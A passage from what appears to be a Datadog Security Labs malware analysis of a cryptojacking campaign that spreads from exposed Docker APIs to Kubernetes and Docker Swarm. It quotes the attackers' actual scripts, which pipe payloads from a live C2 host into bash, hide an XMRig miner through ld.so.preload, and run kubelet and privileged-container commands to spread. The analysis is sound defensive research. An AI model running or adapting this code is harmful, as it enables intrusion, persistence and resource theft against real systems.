        <ul><li><a href="#key-points-and-observations">Key points and observations</a></li><li><a href="#attack-flow">Attack flow</a></li><li><a href="#overview">Overview</a></li><li><a href="#initial-access">Initial access</a></li><li><a href="#actions-on-objective">Actions on objective</a><ul><li><a href="#initsh">init.sh </a></li></ul></li><li><a href="#lateral-movement">Lateral movement</a><ul><li><a href="#kubelateralsh">kube.lateral.sh </a></li><li><a href="#spread-docker-localsh">spread_docker_local.sh </a></li><li><a href="#spread-sshsh">spread_ssh.sh </a></li></ul></li><li><a href="#resource-hijacking">Resource hijacking</a></li><li><a href="#c2-enumeration-and-additional-payloads">C2 enumeration and additional payloads</a></li><li><a href="#attribution">Attribution</a></li><li><a href="#how-datadog-can-help">How Datadog can help</a></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#indicators-of-compromise">Indicators of compromise</a></li></ul>
      </nav>
    
  
</nav>

    </aside>

    <div class="col-span-12 desktop:col-span-8">
      <div class="authors grid grid-cols-2 tablet-lg:gap-x-[30px] gap-x-[14px] tablet-lg:gap-y-4 mobile:gap-y-3 gap-y-2">
        
          



<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img
        src="https://datadog-securitylabs.imgix.net/img/authors/matt_muir.jpg?auto=format&amp;w=48&amp;h=48&dpr=2&q=75"
        alt="Matt Muir"
        class="rounded-full w-12 h-12 max-w-max max-h-max"
        loading="eager"
    />
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Matt Muir</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Security Researcher - Linux Malware</p>
  </div>
</aside>

        
          



<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img
        src="https://datadog-securitylabs.imgix.net/img/authors/generic.png?auto=format&amp;w=48&amp;h=48&dpr=2&q=75"
        alt="Andy Giron"
        class="rounded-full w-12 h-12 max-w-max max-h-max"
        loading="eager"
    />
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Andy Giron</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Senior Security Researcher</p>
  </div>
</aside>

        
      </div>

      <span class="block pb-9 tablet:pb-12 desktop:pb-15"></span>

      

      <div class="article-content relative">
        <h2 id="key-points-and-observations" tabindex="-1"><a class="header-anchor" href="#key-points-and-observations">Key points and observations</a></h2>
<ul>
<li>We have discovered a new cryptojacking campaign targeting Docker Engine API, with the ability to move laterally to Docker Swarm, Kubernetes, and SSH servers.</li>
<li>We witnessed the threat actor joining compromised hosts in a threat actor-controlled Docker Swarm cluster, which enabled them to use Docker Swarm's orchestration features for command and control (C2) purposes.</li>
<li>The campaign leverages Docker Hub, where the threat actor is hosting a number of malicious images. These images were still live at the time of writing.</li>
<li>Hardcoded file system paths present in the payloads suggest targeting of compute infrastructure used for GitHub Codespaces.</li>
</ul>
<h2 id="attack-flow" tabindex="-1"><a class="header-anchor" href="#attack-flow">Attack flow</a></h2>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/attack.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="600" style="max-width: 600px;"
          srcset="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/attack.png?auto=format&w=600&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/attack.png?auto=format&w=600&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/attack.png?auto=format&w=600&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/attack.png?auto=format&w=600&dpr=1.75"
          alt="Attack graph (click to enlarge)."
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Attack graph (click to enlarge).</figcaption></a> 
      </figure>
<h2 id="overview" tabindex="-1"><a class="header-anchor" href="#overview">Overview</a></h2>
<p>Datadog Security Research recently discovered a new malware campaign targeting microservice technologies, namely Docker and Kubernetes. The campaign exploits Docker for initial access, deploying a cryptocurrency miner on infected containers before retrieving and executing a number of malicious payloads.</p>
<p>These payloads are dedicated to lateral movement from the infected container to related hosts running Docker, Kubernetes, or SSH. One such payload is used to identify and compromise Kubernetesâ kubelet API. The <a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/">kubelet API</a> provides a way to programmatically manage pods (logical groups of containers) within a Kubernetes node. If compromised, a threat actor can use this API endpoint to deploy additional resources and execute malware on the containers themselves.</p>
<p>Analysis of this campaign also revealed a Docker Hub user operated by the threat actors with the username <code>nmlmweb3</code>. Itâs <a href="https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/">not the first time</a> Dockerâs container registry has been used to distribute malware, but this particular user and their repositories have yet to be discussed in public reporting.</p>
<p>In addition to the payloads deployed in this attack, we discovered even more tooling used by this threat actor. Enumeration of an open web directory in the threat actorâs Command and Control (C2) server revealed a number of additional malware samples, demonstrating their targeting of Docker Swarm. Another Docker Hub user and associated repositories were also discovered.</p>
<h2 id="initial-access" tabindex="-1"><a class="header-anchor" href="#initial-access">Initial access</a></h2>
<p>The attack begins with a malicious command the threat actors used against Docker API endpoints exposed to the Internet without authentication. This is a common <a href="https://securitylabs.datadoghq.com/articles/analysis-of-teamtnt-doppelganger/">infection vector</a> in cloud environments. Vulnerable endpoints are identified using Internet scanning tools, such as <code>masscan</code> and <code>zgrab</code>, that have been deployed on compromised nodes (compute instances or containers). This allows the group's malware to propagate in a worm-like fashion, allowing lateral movement across cloud infrastructure.</p>
<p>Once a vulnerable endpoint has been identified, the malware uses the Docker API to spawn an Alpine container, mounts the underlying hostâs file system inside the container, and executes a shell command to retrieve an initialization script responsible for starting the infection chain.</p>
<pre class="language-json"><code class="language-json">  <span class="token property">"Cmd"</span><span class="token operator">:</span> <span class="token punctuation">[</span>  
    <span class="token string">"chroot"</span><span class="token punctuation">,</span>  
    <span class="token string">"/mnt"</span><span class="token punctuation">,</span>  
    <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>  
    <span class="token string">"-c"</span><span class="token punctuation">,</span>  
    <span class="token string">"curl -sL4 http://solscan.live/sh/init.sh | bash;"</span>  
  <span class="token punctuation">]</span><span class="token punctuation">,</span>  </code></pre>
<p><em>Malicious shell command used to retrieve initialisation script</em></p>
<pre class="language-json"><code class="language-json">â¦  
<span class="token property">"HostConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>  
    <span class="token property">"Binds"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"/:/mnt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
â¦  </code></pre>
<p><em>Binding the Docker hostâs file system to a mount point in the container</em></p>
<h2 id="actions-on-objective" tabindex="-1"><a class="header-anchor" href="#actions-on-objective">Actions on objective</a></h2>
<h3 id="initsh" tabindex="-1"><a class="header-anchor" href="#initsh">init.sh<code> </code></a></h3>
<p>The initialization script (<code>init.sh</code>) prepares the container for additional compromise by first ensuring that data transfer tools such as <code>curl</code> and <code>wget</code> are installed. The malware then determines if itâs running as the root user and, if so, proceeds to retrieve the official XMRig setup script from GitHub and execute it with the following XMRig User string (<a href="https://attack.mitre.org/techniques/T1496/">T1496</a>):</p>
<p><code>4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9</code></p>
<p>To conceal the process after execution, the script retrieves a process hider compiled as a Linux shared object file from the C2 server and saves it as <code>/etc/rig.so</code>. The shared object is then registered with the dynamic linker by echoing its path into the file <code>/etc/ld.so.preload</code>. This ensures that the file is executed every time another binary on the system is executed, a technique known as Dynamic Linker Hijacking (<a href="https://attack.mitre.org/techniques/T1574/006/">T1574.006</a>).</p>
<p>The process hider itself is a custom fork of <a href="https://github.com/gianlucaborello/libprocesshider">libprocesshider</a>, with the process name of <code>xmrig</code> hardcoded. Executing this via Dynamic Linker Hijacking means that the process hider will always be running in the background, ensuring that anything with the name <code>xmrig</code> is hidden from process listing tools such as <code>top</code> and <code>ps</code>.</p>
<p><code>init.sh</code> finishes by retrieving a number of additional payloads from the C2 and executing them in memory by either piping them through <code>bash</code> or <code>sh</code>. These payloads will be discussed in the coming sections. The malware also retrieves a custom version of XMRig if the user is non-root and saves this as <code>/var/tmp/dockerd</code> before executing it. This technique is used as an alternative attempt to disguise the XMRig process in situations where the user is non-root, as root privileges are required to write to <code>/etc/ld.so.preload</code>.</p>
<pre class="language-bash"><code class="language-bash">â¦
<span class="token function">wget</span> https://solscan.live/so/xmrig.so <span class="token parameter variable">-O</span> /etc/rig.so <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"/etc/rig.so"</span> <span class="token operator">>></span> /etc/ld.so.preload

<span class="token function">wget</span> <span class="token parameter variable">-O</span> - https://solscan.live/sh/kube.lateral.sh <span class="token operator">|</span> <span class="token function">bash</span> <span class="token operator">&amp;</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"/root/.ssh/id_rsa"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> - https://solscan.live/sh/spread_ssh.sh <span class="token operator">|</span> <span class="token function">bash</span> <span class="token punctuation">;</span> <span class="token keyword">fi</span>
<span class="token function">wget</span> <span class="token parameter variable">-O</span> - https://solscan.live/sh/spread_docker_local.sh <span class="token operator">|</span> <span class="token function">bash</span> <span class="token operator">&amp;</span>
â¦</code></pre>
<p><em>Excerpt from <a href="http://init.sh">init.sh</a> showing Dynamic Linker Hijacking and retrieval of additional payloads</em></p>
<h2 id="lateral-movement" tabindex="-1"><a class="header-anchor" href="#lateral-movement">Lateral movement</a></h2>
<h3 id="kubelateralsh" tabindex="-1"><a class="header-anchor" href="#kubelateralsh">kube.lateral.sh<code> </code></a></h3>
<p><code>kube.lateral.sh</code> is the first of three scripts executed by <code>init.sh</code> that are responsible for lateral movement. As the name suggests, <code>kube.lateral.sh</code> specifically targets Kubernetes and begins by deploying a number of common defense impairment techniques (<a href="https://attack.mitre.org/techniques/T1562/004/">T1562.004</a>), summarized here:</p>
<ul>
<li>Disabling the system firewall</li>
<li>Updating <code>/etc/resolv.conf</code> to use public DNS resolvers (ensuring DNS requests made by the malware will resolve successfully)</li>
<li>Removing monitoring agents from the host, including those used in Alibaba Cloud and Tencent Cloud</li>
<li>Clearing the syslog</li>
<li>Stopping the AppArmor service and disabling SELinux</li>
</ul>
<p>If the Alpine Package Keeper (apk) is available in the container, the malware will retrieve <code>masscan</code> as an RPM package and install it using the <code>apk</code> command line utility. Otherwise, <code>masscan</code> is cloned from the official GitHub <a href="https://github.com/robertdavidgraham/masscan">repository</a> and compiled on delivery (<a href="https://attack.mitre.org/techniques/T1027/004/">T1027.004</a>). <code>zgrab</code> is installed in a similar manner.</p>
<p>The malware then searches for the directory <code>/root/.kube</code>, which contains client and root certificates for accessing a Kubernetes cluster with <code>kubectl</code>. If this isnât found, a function named <code>setup_ircbot</code> is called. However, this function isnât implemented in the version of the script we analyzed. Similarly, the malware will search for the file <code>/usr/sbin/ps</code>. If not found, a UPX-packed fork of XMRig is retrieved from the C2 and saved to this path. The XMRig fork contains a hardcoded password <code>KubePwn</code> to connect to the mining pool. Code to retrieve another shell script named <code>aws.sh</code> is also included. However, the C2 wasnât serving this script at the time of analysis.</p>
<p>The rest of the script is dedicated to lateral movement to Kubernetes. The malware uses <code>masscan</code> to search for nodes with port 10250 (the Kubelet API) open in randomized subnets within various local area network (LAN) address ranges. These ranges include the following:</p>
<ul>
<li>10.0.0.0/8</li>
<li>172.16.0.0/12</li>
<li>192.168.0.0/16</li>
<li>169.254.0.0/16</li>
<li>100.64.0.0/10</li>
</ul>
<p>If an IP is found with the target port open, a request is made to the <code>/runningpods/</code> endpoint of the kubelet API, and the script will use <code>jq</code> to parse the namespace, pod name, and container name for containers running within pods on the Kubernetes host. If successful, the malware reports this back to the C2 via an HTTP <code>GET</code> request to a URL with the parameter <code>?target=&lt;ip&gt;</code>:</p>
<pre class="language-bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-sLk</span> https://solscan.live/up/kube_in.php?target<span class="token operator">=</span><span class="token variable">$theip</span></code></pre>
<p>For each container discovered, <code>bash</code> is installed along with <code>curl</code> and <code>wget</code>. These are then used to retrieve the payload <code>setup_xmr.sh</code> and save it as <code>/tmp/.x1mr</code> (if <code>wget</code> is used) or <code>/tmp/.x2mr</code> (if <code>curl</code> is used).</p>
<p>Note that the Kubernetes lateral movement techniques described above are very similar to those reported by <a href="https://www.trendmicro.com/en_us/research/21/e/teamtnt-targets-kubernetes--nearly-50-000-ips-compromised.html">Trend Micro</a> in a campaign attributed to TeamTNT in May 2021.</p>
<pre class="language-bash"><code class="language-bash"><span class="token function-name function">kube_pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token assign-left variable">LRANGE</span><span class="token operator">=</span><span class="token variable">$1</span>
    <span class="token assign-left variable">rndstr</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>
        <span class="token function">head</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> a-z <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">6</span>
        <span class="token builtin class-name">echo</span> <span class="token string">''</span>
    <span class="token variable">)</span></span>
    <span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$rndstr</span>"</span><span class="token operator">=</span><span class="token string">"'<span class="token variable"><span class="token variable">$(</span>masscan <span class="token parameter variable">--open</span> <span class="token parameter variable">-p10250</span> $LRANGE <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">250000</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $6}'</span><span class="token variable">)</span></span>'"</span>
    <span class="token keyword">for</span> <span class="token for-or-select variable">ipaddr</span> <span class="token keyword">in</span> <span class="token variable">${<span class="token operator">!</span>rndstr}</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token variable">$TEMPFILE</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">$TEMPFILE</span><span class="token punctuation">;</span> <span class="token keyword">fi</span>
        <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-sLk</span> https://<span class="token variable">$theip</span>:10250/runningpods/ <span class="token operator">|</span> jq <span class="token parameter variable">-r</span> <span class="token string">'.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name'</span> <span class="token operator">>></span><span class="token variable">$TEMPFILE</span>
        <span class="token assign-left variable">KUBERES</span><span class="token operator">=</span><span class="token variable">$?</span>
        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$KUBERES</span>"</span> <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
            <span class="token function">curl</span> <span class="token parameter variable">-sLk</span> https://solscan.live/up/kube_in.php?target<span class="token operator">=</span><span class="token variable">$theip</span>
            <span class="token keyword">while</span> <span class="token builtin class-name">read</span> namespace podname containername<span class="token punctuation">;</span> <span class="token keyword">do</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apt update --fix-missing"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apk update"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"yum install -y bash"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"yum install -y wget"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"yum install -y curl"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apt install -y bash"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apt install -y wget"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apt install -y curl"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apk add bash"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apk add wget"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"apk add curl"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"wget "</span><span class="token variable">$INITPLOAD</span><span class="token string">" -O /tmp/.x1mr"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"curl "</span><span class="token variable">$INITPLOAD</span><span class="token string">" -o /tmp/.x2mr"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"sh /tmp/.x1mr"</span>
                <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token variable">$T1OUT</span> <span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token parameter variable">-k</span> https://<span class="token variable">$theip</span>:10250/run/<span class="token variable">$namespace</span>/<span class="token variable">$podname</span>/<span class="token variable">$containername</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"sh /tmp/.x2mr"</span>
            <span class="token keyword">done</span> <span class="token operator">&lt;</span><span class="token variable">$TEMPFILE</span>
            <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$TEMPFILE</span>
        <span class="token keyword">fi</span>
    <span class="token keyword">done</span>
<span class="token punctuation">}</span>

<span class="token assign-left variable">LAN_RANGES</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"10.0.0.0/8"</span> <span class="token string">"172.16.0.0/12"</span> <span class="token string">"192.168.0.0/16"</span> <span class="token string">"169.254.0.0/16"</span> <span class="token string">"100.64.0.0/10"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">LRANGE</span> <span class="token keyword">in</span> <span class="token variable">${LAN_RANGES<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span><span class="token punctuation">;</span> <span class="token keyword">do</span> kube_pwn <span class="token variable">$LRANGE</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
</code></pre>
<p><em>Kubernetes lateral movement functionality</em></p>
<h3 id="spread-docker-localsh" tabindex="-1"><a class="header-anchor" href="#spread-docker-localsh">spread_docker_local.sh<code> </code></a></h3>
<p>To aid lateral movement to Docker endpoints in addition to Kubernetes, <code>init.sh</code> executes another shell script named <code>spread_docker_local.sh</code>. This script uses <code>masscan</code> and <code>zgrab</code> to scan the same LAN ranges described above for nodes with ports 2375, 2376, 2377, 4244, and 4243 open. These ports are associated with either Docker Engine or <a href="https://docs.docker.com/engine/swarm/">Docker Swarm</a>.</p>
<p>For <code>masscan</code>, the threat actor uses the <code>--router-mac</code> parameter with the value <code>66-55-44-33-22-11</code> to limit the scan to local network devices. An example of the scanning commands for <code>masscan</code> and <code>zgrab</code> can be seen below:</p>
<pre class="language-bash"><code class="language-bash"><span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$rndstr</span>"</span><span class="token operator">=</span><span class="token string">"'<span class="token variable"><span class="token variable">$(</span>masscan --router-mac <span class="token number">66</span>-55-44-33-22-11 $range -p$port <span class="token parameter variable">--rate</span><span class="token operator">=</span>$rate <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $6}'</span><span class="token operator">|</span> zgrab <span class="token parameter variable">--senders</span> <span class="token number">200</span> <span class="token parameter variable">--port</span> $port <span class="token parameter variable">--http</span><span class="token operator">=</span><span class="token string">'/v1.16/version'</span> --output-file<span class="token operator">=</span>- <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'ApiVersion|client version 1.16'</span> <span class="token operator">|</span> jq <span class="token parameter variable">-r</span> .ip<span class="token variable">)</span></span>'"</span><span class="token punctuation">;</span></code></pre>
<p>For any IPs discovered with the target ports open, the malware attempts to spawn a new container with the name <code>alpine</code>. This container is based on an image named <code>upspin</code>, hosted on Docker Hub by the user <code>nmlmweb3</code>. At the time of writing, this malicious user was still active in Docker Hub and had six repositories listed under their account.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/docker-hub.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/docker-hub.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/docker-hub.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/docker-hub.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/threat-actors-leveraging-docker-swarm-kubernetes-mine-cryptocurrency/docker-hub.png?auto=format&w=800&dpr=1.75"
          alt="Screenshot of nmlmweb3âs Docker Hub user profile at the time of writing (click to enlarge)."
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Screenshot of nmlmweb3âs Docker Hub user profile at the time of writing (click to enlarge).</figcaption></a> 
      </figure>
<p>The Docker image tag thatâs used to retrieve the image from Docker Hub is specified by the threat actor's C2 server by using a text file pulled to the compromised host at the beginning of the script. This allows the threat actors to easily update the campaign with a new malicious image should the existing one be taken down.</p>
<pre class="language-bash"><code class="language-bash"><span class="token assign-left variable">PWNTAINER</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> https://solscan.live/data/docker.container.local.spread.txt<span class="token variable">)</span></span></code></pre>
<p><em>Command to retrieve the Docker image tag from the C2 server and store it in the variable <code>PWNTAINER</code></em></p>
<p>At the time of writing, the <code>upspin</code> image simply executes the <code>init.sh</code> script covered previously. An additional container is also spawned on discovered hosts, this time based on the vanilla Alpine Linux image. In the same command used to spawn the container, the threat actor installs <code>bash</code>, <code>curl</code>, and <code>wget</code> before retrieving the <code>init.sh</code> script from the C2 and executing it in memory by piping through <code>sh</code>.</p>
<pre class="language-bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">ipaddy</span> <span class="token keyword">in</span> <span class="token variable">${<span class="token operator">!</span>rndstr}</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">120</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> <span class="token variable">$TARGET</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--network</span> <span class="token function">host</span> <span class="token parameter variable">--privileged</span> <span class="token parameter variable">--name</span> alpine <span class="token parameter variable">-v</span> /:/host <span class="token variable">$PWNTAINER</span> <span class="token operator">&amp;</span> 
  <span class="token function">timeout</span> <span class="token parameter variable">-s</span> SIGKILL <span class="token number">240</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> <span class="token variable">$TARGET</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--network</span> <span class="token function">host</span> <span class="token parameter variable">--privileged</span> <span class="token parameter variable">-v</span> /:/mnt alpine <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh'</span> <span class="token operator">&amp;</span>
<span class="token keyword">done</span></code></pre>
<p><em>Commands used to spawn malicious containers on discovered Docker hosts</em></p>
<h3 id="spread-sshsh" tabindex="-1"><a class="header-anchor" href="#spread-sshsh">spread_ssh.sh<code> </code></a></h3>
